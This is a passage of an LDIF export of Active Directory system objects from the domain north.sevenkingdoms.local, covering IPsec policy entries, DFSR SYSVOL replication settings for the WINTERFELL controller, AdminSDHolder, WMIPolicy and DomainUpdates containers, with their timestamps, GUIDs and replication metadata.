dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# IP Security, System, north.sevenkingdoms.local  
dn: CN=IP Security,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}, IP Security, System, north  
 .sevenkingdoms.local  
dn: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys  
 tem,DC=north,DC=sevenkingdoms,DC=local

\# ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}, IP Security, System,  
  north.sevenkingdoms.local  
dn: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000},CN=IP Security,  
 CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{72385232-70FA-11D1-864C-14A300000000}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}, IP Security, Sy  
 stem, north.sevenkingdoms.local  
dn: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000},CN=IP Secu  
 rity,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}, IP Security, System, north  
 .sevenkingdoms.local  
dn: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys  
 tem,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy  
 stem, north.sevenkingdoms.local  
dn: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu  
 rity,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}, IP Security, Sy  
 stem, north.sevenkingdoms.local  
dn: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000},CN=IP Secu  
 rity,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecFilter{72385235-70FA-11D1-864C-14A300000000}, IP Security, System, north  
 .sevenkingdoms.local  
dn: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys  
 tem,DC=north,DC=sevenkingdoms,DC=local

\# ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}, IP Security, System, north  
 .sevenkingdoms.local  
dn: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys  
 tem,DC=north,DC=sevenkingdoms,DC=local

\# ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}, IP Security, System,  
  north.sevenkingdoms.local  
dn: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000},CN=IP Security,  
 CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy  
 stem, north.sevenkingdoms.local  
dn: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu  
 rity,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}, IP Security, System, north  
 .sevenkingdoms.local  
dn: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys  
 tem,DC=north,DC=sevenkingdoms,DC=local

\# ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}, IP Security, System,  
  north.sevenkingdoms.local  
dn: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000},CN=IP Security,  
 CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}, IP Security, Sy  
 stem, north.sevenkingdoms.local  
dn: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000},CN=IP Secu  
 rity,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy  
 stem, north.sevenkingdoms.local  
dn: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu  
 rity,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}, IP Security, System, north.se  
 venkingdoms.local  
dn: CN=ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17},CN=IP Security,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local

\# DFSR-GlobalSettings, System, north.sevenkingdoms.local  
dn: CN=DFSR-GlobalSettings,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-GlobalSettings  
cn: DFSR-GlobalSettings  
distinguishedName: CN=DFSR-GlobalSettings,CN=System,DC=north,DC=sevenkingdoms,  
 DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12963  
uSNChanged: 12964  
showInAdvancedViewOnly: TRUE  
name: DFSR-GlobalSettings  
objectGUID:: w2Zu4aoeSUiSAzPR4zipIw==  
objectCategory: CN=ms-DFSR-GlobalSettings,CN=Schema,CN=Configuration,DC=sevenk  
 ingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-Flags: 48

\# Domain System Volume, DFSR-GlobalSettings, System, north.sevenkingdoms.local  
dn: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=north,DC=seven  
 kingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-ReplicationGroup  
cn: Domain System Volume  
distinguishedName: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC  
 \=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12965  
uSNChanged: 12965  
showInAdvancedViewOnly: TRUE  
name: Domain System Volume  
objectGUID:: H/hlFMYSuk66BXTC0hv4cQ==  
objectCategory: CN=ms-DFSR-ReplicationGroup,CN=Schema,CN=Configuration,DC=seve  
 nkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-ReplicationGroupType: 1

\# Content, Domain System Volume, DFSR-GlobalSettings, System, north.sevenkingdo  
 ms.local  
dn: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=nor  
 th,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-Content  
cn: Content  
distinguishedName: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,C  
 N=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12966  
uSNChanged: 12966  
showInAdvancedViewOnly: TRUE  
name: Content  
objectGUID:: NSj/2NPSx06xSgxcrF9ZwQ==  
objectCategory: CN=ms-DFSR-Content,CN=Schema,CN=Configuration,DC=sevenkingdoms  
 ,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# SYSVOL Share, Content, Domain System Volume, DFSR-GlobalSettings, System, nor  
 th.sevenkingdoms.local  
dn: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,  
 CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-ContentSet  
cn: SYSVOL Share  
distinguishedName: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-  
 GlobalSettings,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12967  
uSNChanged: 12967  
showInAdvancedViewOnly: TRUE  
name: SYSVOL Share  
objectGUID:: n+11Jq7K1Ei9fOo+VYY8uA==  
objectCategory: CN=ms-DFSR-ContentSet,CN=Schema,CN=Configuration,DC=sevenkingd  
 oms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-FileFilter: \~\*,\*.TMP,\*.BAK  
msDFSR-DirectoryFilter: DO\_NOT\_REMOVE\_NtFrs\_PreInstall\_Directory,NtFrs\_PreExis  
 ting\_\_\_See\_EventLog

\# Topology, Domain System Volume, DFSR-GlobalSettings, System, north.sevenkingd  
 oms.local  
dn: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=no  
 rth,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-Topology  
cn: Topology  
distinguishedName: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,  
 CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12968  
uSNChanged: 12968  
showInAdvancedViewOnly: TRUE  
name: Topology  
objectGUID:: MZO2o4OoyUyWJvsAZj5dBg==  
objectCategory: CN=ms-DFSR-Topology,CN=Schema,CN=Configuration,DC=sevenkingdom  
 s,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# WINTERFELL, Topology, Domain System Volume, DFSR-GlobalSettings, System, nort  
 h.sevenkingdoms.local  
dn: CN=WINTERFELL,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,C  
 N=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-Member  
cn: WINTERFELL  
distinguishedName: CN=WINTERFELL,CN=Topology,CN=Domain System Volume,CN=DFSR-G  
 lobalSettings,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12971  
uSNChanged: 12971  
showInAdvancedViewOnly: TRUE  
name: WINTERFELL  
objectGUID:: wBk9cbph/ES2MD7bLI4i4w==  
serverReference: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-Si  
 te-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
objectCategory: CN=ms-DFSR-Member,CN=Schema,CN=Configuration,DC=sevenkingdoms,  
 DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-ComputerReference: CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=seve  
 nkingdoms,DC=local  
msDFSR-MemberReferenceBL: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=WIN  
 TERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local

\# AdminSDHolder, System, north.sevenkingdoms.local  
dn: CN=AdminSDHolder,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: AdminSDHolder  
distinguishedName: CN=AdminSDHolder,CN=System,DC=north,DC=sevenkingdoms,DC=loc  
 al  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 7806  
uSNChanged: 13641  
showInAdvancedViewOnly: TRUE  
name: AdminSDHolder  
objectGUID:: Ri2Bx80mYkeQU2trWk9DDQ==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250826142036.0Z  
dSCorePropagationData: 20250826132036.0Z  
dSCorePropagationData: 20250826122036.0Z  
dSCorePropagationData: 20250826112036.0Z  
dSCorePropagationData: 16010101000000.0Z

\# ComPartitions, System, north.sevenkingdoms.local  
dn: CN=ComPartitions,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: ComPartitions  
distinguishedName: CN=ComPartitions,CN=System,DC=north,DC=sevenkingdoms,DC=loc  
 al  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7807  
uSNChanged: 7807  
showInAdvancedViewOnly: TRUE  
name: ComPartitions  
objectGUID:: /OzUMUqe0keqv0NgSIpaSw==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# ComPartitionSets, System, north.sevenkingdoms.local  
dn: CN=ComPartitionSets,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: ComPartitionSets  
distinguishedName: CN=ComPartitionSets,CN=System,DC=north,DC=sevenkingdoms,DC=  
 local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7808  
uSNChanged: 7808  
showInAdvancedViewOnly: TRUE  
name: ComPartitionSets  
objectGUID:: zMqorZaogkWgp3hb1jC5EA==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# WMIPolicy, System, north.sevenkingdoms.local  
dn: CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: WMIPolicy  
distinguishedName: CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7809  
uSNChanged: 7809  
showInAdvancedViewOnly: TRUE  
name: WMIPolicy  
objectGUID:: iz2Cgdpi+k65dfqBwoF1XQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101000000.0Z

\# PolicyTemplate, WMIPolicy, System, north.sevenkingdoms.local  
dn: CN=PolicyTemplate,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=loca  
 l  
objectClass: top  
objectClass: container  
cn: PolicyTemplate  
distinguishedName: CN=PolicyTemplate,CN=WMIPolicy,CN=System,DC=north,DC=sevenk  
 ingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7810  
uSNChanged: 7810  
showInAdvancedViewOnly: TRUE  
name: PolicyTemplate  
objectGUID:: RnDfy0/vE0uAP2MSd9xJzA==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 16010101000000.0Z

\# SOM, WMIPolicy, System, north.sevenkingdoms.local  
dn: CN=SOM,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: SOM  
distinguishedName: CN=SOM,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=  
 local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7811  
uSNChanged: 7811  
showInAdvancedViewOnly: TRUE  
name: SOM  
objectGUID:: bqaiBtpA8kCAPhrxTnSKdg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 16010101000000.0Z

\# PolicyType, WMIPolicy, System, north.sevenkingdoms.local  
dn: CN=PolicyType,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: PolicyType  
distinguishedName: CN=PolicyType,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingd  
 oms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7812  
uSNChanged: 7812  
showInAdvancedViewOnly: TRUE  
name: PolicyType  
objectGUID:: zU4Dt9TR6UW9fe5uPvVT4Q==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 16010101000000.0Z

\# WMIGPO, WMIPolicy, System, north.sevenkingdoms.local  
dn: CN=WMIGPO,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: WMIGPO  
distinguishedName: CN=WMIGPO,CN=WMIPolicy,CN=System,DC=north,DC=sevenkingdoms,  
 DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7813  
uSNChanged: 7813  
showInAdvancedViewOnly: TRUE  
name: WMIGPO  
objectGUID:: VYieEiN7Zkq3ye1nCZ2Lpg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 16010101000000.0Z

\# DomainUpdates, System, north.sevenkingdoms.local  
dn: CN=DomainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: DomainUpdates  
distinguishedName: CN=DomainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=loc  
 al  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7814  
uSNChanged: 7814  
showInAdvancedViewOnly: TRUE  
name: DomainUpdates  
objectGUID:: \+HO1PEgtnEGQuhVG0ZHT0A==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Operations, DomainUpdates, System, north.sevenkingdoms.local  
dn: CN=Operations,CN=DomainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=loca  
 l  
objectClass: top  
objectClass: container  
cn: Operations  
distinguishedName: CN=Operations,CN=DomainUpdates,CN=System,DC=north,DC=sevenk  
 ingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7815  
uSNChanged: 7815  
showInAdvancedViewOnly: TRUE  
name: Operations  
objectGUID:: 3Dj5yVgkSE6fXfqxRzZlvw==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6E157EDF-4E72-4052-A82A-EC3F91021A22, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6E157EDF-4E72-4052-A82A-EC3F91021A22  
distinguishedName: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12360  
uSNChanged: 12360  
showInAdvancedViewOnly: TRUE  
name: 6E157EDF-4E72-4052-A82A-EC3F91021A22  
objectGUID:: Q9MQ/LXCJU+tNot5o6N7Og==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# ab402345-d3c3-455d-9ff7-40268a1099b6, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: ab402345-d3c3-455d-9ff7-40268a1099b6  
distinguishedName: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7816  
uSNChanged: 7816  
showInAdvancedViewOnly: TRUE  
name: ab402345-d3c3-455d-9ff7-40268a1099b6  
objectGUID:: blPL4JG3cUqQQu/SXKyuZA==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# bab5f54d-06c8-48de-9b87-d78b796564e4, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: bab5f54d-06c8-48de-9b87-d78b796564e4  
distinguishedName: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7817  
uSNChanged: 7817  
showInAdvancedViewOnly: TRUE  
name: bab5f54d-06c8-48de-9b87-d78b796564e4  
objectGUID:: 2fi9GzpJ5kKxthTsOZCyzA==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5  
distinguishedName: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7818  
uSNChanged: 7818  
showInAdvancedViewOnly: TRUE  
name: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5  
objectGUID:: AMHUU3FfoEG32Mh6QtECrQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 2416c60a-fe15-4d7a-a61e-dffd5df864d3, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 2416c60a-fe15-4d7a-a61e-dffd5df864d3  
distinguishedName: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7819  
uSNChanged: 7819  
showInAdvancedViewOnly: TRUE  
name: 2416c60a-fe15-4d7a-a61e-dffd5df864d3  
objectGUID:: sCZX0gaO/kCcUbYaAIGo7g==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 7868d4c8-ac41-4e05-b401-776280e8e9f1, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 7868d4c8-ac41-4e05-b401-776280e8e9f1  
distinguishedName: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7820  
uSNChanged: 7820  
showInAdvancedViewOnly: TRUE  
name: 7868d4c8-ac41-4e05-b401-776280e8e9f1  
objectGUID:: lMiEHYQUZ0O0qqZKvV0fRg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 860c36ed-5241-4c62-a18b-cf6ff9994173, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 860c36ed-5241-4c62-a18b-cf6ff9994173  
distinguishedName: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7821  
uSNChanged: 7821  
showInAdvancedViewOnly: TRUE  
name: 860c36ed-5241-4c62-a18b-cf6ff9994173  
objectGUID:: CuU1a7z0kEqwyKi0h1wKeQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e  
distinguishedName: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7822  
